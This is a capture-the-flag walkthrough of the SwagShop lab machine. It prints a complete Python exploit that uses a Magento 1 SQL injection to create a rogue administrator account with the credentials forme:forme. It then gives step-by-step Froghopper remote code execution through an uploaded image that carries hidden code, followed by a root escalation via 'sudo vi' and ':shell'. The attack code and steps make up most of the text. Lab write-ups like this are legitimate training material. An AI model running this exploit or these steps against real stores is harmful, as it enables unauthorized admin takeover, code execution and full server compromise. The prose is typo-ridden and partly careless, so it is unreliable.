```
The machine begins with the enumeration of a webserver. It will redirect to swagshop.htb domain. Adding this to the /etc/hosts list, the main page will resolve good.
After look at the main page, an attacker would do a brute force enumeration of directories with `wfuzz`. This tool will report all combination with correct status code. Examine all of them. There would be a possible risk in shell directory...
Any way, it seems that is impossible to penetration, but look for vulnerabilities reported of Magento with `searchsploit` and there is an RCE. This one has some mistake so here you can see edited:

``` python
import requests
import base64
import sys

target = "http://swagshop.htb/index.php/"

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "/admin/Cms_Wysiwyg/directive/index/"

q="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""
query = q.replace("\n", "").format(username="forme", password="forme")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query).encode('utf-8')

r = requests.post(target_url,
                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                        "filter": base64.b64encode(pfilter),
                        "forwarded": 1})
if r.ok:
    print ("WORKED")
    print ("Check {0}/admin with creds forme:forme".format(target))
else:
    print ("DID NOT WORK")

```
This script will create a new admin user with an SQLI.

### Exploit vulnerabilities
Once the attacker is inside the web as Administrator, he can exploit a *Froghopper* vulnerability. [This](https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper) is a tutorial where you'll learn about it. 

The Froghopper attack methodology is abaible in some unpathed versions of Magento 1. 
Firstly, the attacker can upload a file to the system. There are some extensions that are allowed. JPG and PNG are avaible. 
However, the system will not examine the content of this file, and in a typical Magneto configuration, files are uploaded and stored in a publicly accessible directory `media/catalog/category`.
Only the attacker needs is to launch this malicius file. In Magento is possible to upload a new template and execute block of command if you are admin... So, that's all.

Step by step:
1. Create an image with some malicios code at ends.
2. Upload it to the new category page. (Catalog > Manage Categories)
3. Generate a new template (Newsletter > Newsletter Template), include the next block of template code between \{\{...\}\}:
`block type='core/template' template='../../../../../../media/catalog/category/malicius_image.jpg'`
4. Finally see the results with the `Preview Template` Button.


### Privilege Scalation
Look for privilege: sudo -l.
> (root) NOPASSWD: /usr/bin/vi /var/www/html/\*

www-data can execute vi command as root in `/var/www/html/`. 
1. `sudo vi /var/www/html/notfound`
2. :set shell=/bin/bash
3. :shell
You get it!
